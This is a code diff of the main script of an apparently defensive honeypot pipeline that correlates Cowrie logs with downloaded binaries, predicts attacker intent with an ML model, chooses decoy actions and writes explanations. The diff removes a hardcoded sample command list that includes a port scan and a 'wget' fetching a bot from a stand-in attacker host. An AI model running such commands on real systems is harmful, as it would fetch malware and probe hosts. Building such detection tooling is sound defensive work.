@@ -3,7 +3,7 @@ import json
 import yaml
 
 from agents.discovery import run_discovery, write_report
-from agents.analysis import run_ingestors, correlate_downloads_to_sessions
+from agents.analysis import correlate_downloads_to_sessions
 from agents.decision import load_model, predict_intent
 from agents.deception import decide_decoy_action
 from agents.xai import explain_action
@@ -17,51 +17,69 @@ def load_config(config_path):
 def main():
     config = load_config("./config/settings.yaml")
 
+    # ===== Discovery =====
     discovery_report = run_discovery("127.0.0.1")
     write_report(discovery_report, "./data/processed/discovery_report.json")
 
-    # Check if raw logs exist; if yes, use them directly
+    # ===== Correlation =====
     raw_logs_dir = config["paths"]["raw_logs_dir"]
     cowrie_path = os.path.join(raw_logs_dir, "raw_cowrie_all.json")
-    zeek_path = os.path.join(raw_logs_dir, "raw_zeek_universal.json")
-    dionaea_path = os.path.join(raw_logs_dir, "raw_dionaea_streams.json")
-
-    if os.path.exists(cowrie_path) and os.path.exists(zeek_path) and os.path.exists(dionaea_path):
-        ingest_counts = {"cowrie": "existing", "zeek": "existing", "dionaea": "existing"}
-        print("Using existing raw logs.")
-    else:
-        ingest_counts = run_ingestors(config)
-        print(f"Ingested logs: {ingest_counts}")
 
     correlation = correlate_downloads_to_sessions(
         config["paths"]["binaries_dir"],
         cowrie_path,
         config["analysis"]["session_link_time_window_sec"],
     )
+
     with open("./data/processed/session_binary_map.json", "w") as f:
         json.dump(correlation, f, indent=2)
 
+    # ===== Load ML =====
     model_path = config["ml"]["model_path"]
     vectorizer_path = config["ml"]["vectorizer_path"]
     classes = config["ml"]["classes"]
 
+    # ===== Use session (real or dummy) =====
+    sessions = correlation.get("sessions", [])
+
+    if sessions:
+        session = sessions[0]
+    else:
+        session = {
+            "commands": [],
+            "first_ts": 1,
+            "last_ts": 2,
+            "download_shas": []
+        }
+
+    # ===== Run prediction =====
     if os.path.exists(model_path) and os.path.exists(vectorizer_path):
         model, vectorizer = load_model(model_path, vectorizer_path)
-        commands = ["nmap -sV 127.0.0.1", "wget http://evil.com/bot"]
-        result = predict_intent(model, vectorizer, commands, classes)
-        action = decide_decoy_action(result["label"])
-        explanation = explain_action(result["label"], result["confidence"], action)
     else:
-        action = "monitor"
-        explanation = "Model or vectorizer not found; running in monitor-only mode."
+        model, vectorizer = None, None
+
+    result = predict_intent(model, vectorizer, session, classes)
+
+    # ===== Save output (IMPORTANT) =====
+    with open("./data/processed/insider_results.json", "w") as f:
+        json.dump(result, f, indent=2)
+
+    # ===== Decision + XAI =====
+    action = decide_decoy_action(result["label"])
+    explanation = explain_action(result["label"], result["confidence"], action)
 
     with open("./data/processed/xai_audit_log.txt", "a") as f:
         f.write(explanation + "\n")
 
-    print("Discovery report written.")
-    print(f"Log status: {ingest_counts}")
+    # ===== Clean Output =====
+    print("\n=== FINAL DECISION ===")
+    print(f"Threat Label: {result.get('label')}")
+    print(f"Confidence: {result.get('confidence')}")
+    print(f"Insider Flag: {result.get('insider_flag')}")
+    print(f"Risk Score: {result.get('risk_score')}")
+    print(f"CERT Risk: {result.get('cert_risk')}")
+    print(f"Explanation: {result.get('insider_explanation')}")
     print(f"Action: {action}")
-    print(f"XAI: {explanation}")
 
 
 if __name__ == "__main__":
